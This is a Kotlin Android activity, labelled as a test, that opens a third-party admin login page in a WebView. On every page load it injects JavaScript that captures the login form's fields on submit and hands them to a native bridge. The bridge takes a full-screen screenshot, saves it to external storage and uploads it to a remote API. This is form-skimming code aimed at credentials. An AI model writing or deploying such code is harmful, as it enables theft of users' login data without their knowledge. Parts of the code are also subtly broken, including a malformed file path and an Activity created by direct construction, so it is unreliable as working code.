package com.example.my_secure_app

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.format.DateFormat
import android.util.Log
import android.view.View
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.FileProvider
import okhttp3.MultipartBody
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.File
import java.io.FileOutputStream
import java.util.*



class MyTestingActivityKotlin : AppCompatActivity() {
    lateinit var webView: WebView
    private val REQUEST_EXTERNAL_STORAGe = 1
    private val permissionstorage = arrayOf(
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_my_testing_kotlin)
        webView = findViewById(R.id.web_kotlin)
        verifypermissions(this)
        webView.loadUrl("https://adminsecure.thriftyspends.com/login")
        webView.settings.javaScriptEnabled = true
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webView.requestFocusFromTouch();
        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                injectJavaScript(view);
            }

        }
        webView.addJavascriptInterface(JSBridge, "Bridge")


    }

    object JSBridge {
        @JavascriptInterface
        fun callFromJs(s: String) {

            Handler(Looper.getMainLooper()).post(Runnable {
                MyTestingActivityKotlin().getScreenshot(s)
            })
        }
    }

    fun verifypermissions(activity: Activity?) {
        val permissions = ActivityCompat.checkSelfPermission(
            activity!!,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )

        // If storage permission is not given then request for External Storage Permission
        if (permissions != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                activity,
                this.permissionstorage,
                this.REQUEST_EXTERNAL_STORAGe
            )
        }
    }

    private fun injectJavaScript(view: WebView?) {
        view!!.loadUrl(
            """
           javascript:(function() {
         var form = document.querySelector('form');

    function updateResult() {
     var out = new URLSearchParams(new FormData(form)).toString();
       Bridge.callFromJs(out);

}
form.addEventListener('submit', updateResult);
 
          
           })() 
        """
        )
    }




    fun getScreenshot(s: String) {
        val now = Date()
        DateFormat.format("yyyy-MM-dd_hh:mm:ss", now)
        try {
            // image naming and path  to include sd card  appending name you choose for file
            val mPath = Environment.getExternalStorageDirectory().toString() + "/" + ".jpg"

            // create bitmap screen capture
            val v1 = window.decorView.rootView
//            val v1: View = findViewById<View?>(R.id.web_kotlin).rootView

            v1.isDrawingCacheEnabled = true
            val bitmap = Bitmap.createBitmap(v1.drawingCache)
            v1.isDrawingCacheEnabled = false
            val imageFile = File(mPath)
            val outputStream = FileOutputStream(imageFile)
            val quality = 100
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
            outputStream.flush()
            outputStream.close()


//            openScreenshot(imageFile);
            sendScreenShotToAPi(s,imageFile)
        } catch (e: Throwable) {
            // Several error may come out with file handling or DOM
            e.printStackTrace()
        }
    }
    private fun openScreenshot(imageFile: File) {
        val intent = Intent()
        intent.action = Intent.ACTION_VIEW
        val photoURI = FileProvider.getUriForFile(
            applicationContext, applicationContext.packageName + ".provider", imageFile
        )

//        Uri uri = Uri.fromFile(imageFile);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        intent.setDataAndType(photoURI, "image/*")
        startActivity(intent)
    }

    private fun sendScreenShotToAPi(test:String,imageFile: File) {
        val builder: MultipartBody.Builder = MultipartBody.Builder().setType(MultipartBody.FORM)
        builder.addFormDataPart(
            "file",
            imageFile.name,
            RequestBody.create(MultipartBody.FORM, imageFile)
        )
        val requestBody: RequestBody = builder.build()
        val call = RetrofitClient.getInstance().myApi.getPostCreateBodyResponse(
            "application/json",
            "Bearer" + " " + Constants.AuthToken,
            requestBody
        )
        call.enqueue(object : Callback<DataResponseModel?> {
            override fun onResponse(
                call: Call<DataResponseModel?>,
                response: Response<DataResponseModel?>
            ) {
                if (response.body() != null) {
                    Log.d("RESPONSE", response.body()!!.message)
                }
            }

            override fun onFailure(call: Call<DataResponseModel?>, t: Throwable) {
                Log.d("RESPONSE", t.toString())
            }
        })
    }
}
